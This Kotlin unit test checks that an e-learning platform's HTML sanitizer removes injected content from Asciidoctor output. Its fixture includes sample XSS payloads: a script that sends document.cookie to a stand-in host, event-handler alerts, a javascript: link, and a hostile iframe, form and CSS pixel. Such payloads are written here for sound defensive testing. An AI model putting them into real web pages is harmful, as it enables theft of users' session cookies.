package elearning.media

import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test

// L3 de #216: el HTML de Asciidoctor con lo que un autor puede colar por ++++ o pass:[]
class GeneratedHtmlTest {
    private val generated =
        """
        <!DOCTYPE html>
        <html lang="es">
        <head>
        <meta charset="UTF-8">
        <title>Lección de prueba</title>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans">
        <style>body{color:#222}</style>
        <script src="https://cdn.example.com/highlight.js"></script>
        </head>
        <body class="article">
        <div id="toc"><ul><li><a href="#_requisitos">Requisitos</a></li></ul></div>
        <div class="sect1"><h2 id="_requisitos">Requisitos</h2>
        <div class="paragraph"><p>Texto <strong>propio</strong> con <a href="https://example.org/doc">un enlace</a>.</p></div>
        <script>fetch('https://evil.example/' + document.cookie)</script>
        <p onclick="alert(1)">Pulsa</p>
        <a href="javascript:alert(2)">mal enlace</a>
        <iframe src="https://evil.example/"></iframe>
        <form action="https://evil.example/"><input name="clave"></form>
        <img src="x" onerror="alert(3)" alt="captura">
        <style>body{background:url(https://evil.example/pixel)}</style>
        </div>
        </body>
        </html>
        """.trimIndent()

    private val clean by lazy { String(GeneratedHtml.sanitize(generated.toByteArray())) }

    @Test
    fun `scripts, event handlers, frames, forms and foreign urls are gone`() {
        assertThat(clean).doesNotContainIgnoringCase("<script")
        assertThat(clean).doesNotContainIgnoringCase("onclick")
        assertThat(clean).doesNotContainIgnoringCase("onerror")
        assertThat(clean).doesNotContainIgnoringCase("javascript:")
        assertThat(clean).doesNotContainIgnoringCase("<iframe")
        assertThat(clean).doesNotContainIgnoringCase("<form")
        assertThat(clean).doesNotContainIgnoringCase("<input")
        assertThat(clean).doesNotContain("evil.example")
        assertThat(clean).doesNotContain("fonts.googleapis.com")
    }

    @Test
    fun `the content, its classes, internal anchors and the asciidoctor style stay`() {
        assertThat(clean.lowercase()).startsWith("<!doctype html>")
        assertThat(clean).contains("<title>Lección de prueba</title>")
        assertThat(clean).contains("<style>body{color:#222}</style>")
        assertThat(clean).contains("<h2 id=\"_requisitos\">Requisitos</h2>")
        assertThat(clean).contains("<a href=\"#_requisitos\">Requisitos</a>")
        assertThat(clean).contains("class=\"paragraph\"")
        assertThat(clean).contains("<strong>propio</strong>")
        assertThat(clean).contains("<a href=\"https://example.org/doc\">un enlace</a>")
        assertThat(clean).contains("Pulsa")
        assertThat(clean).contains("alt=\"captura\"")
    }

    @Test
    fun `a pdf is left as it is`() {
        val pdf = RenderedDocument(ArtifactFormat.PDF, "%PDF-1.7 <script>".toByteArray(), "g", "1")

        assertThat(GeneratedHtml.sanitize(pdf)).isSameAs(pdf)
    }
}
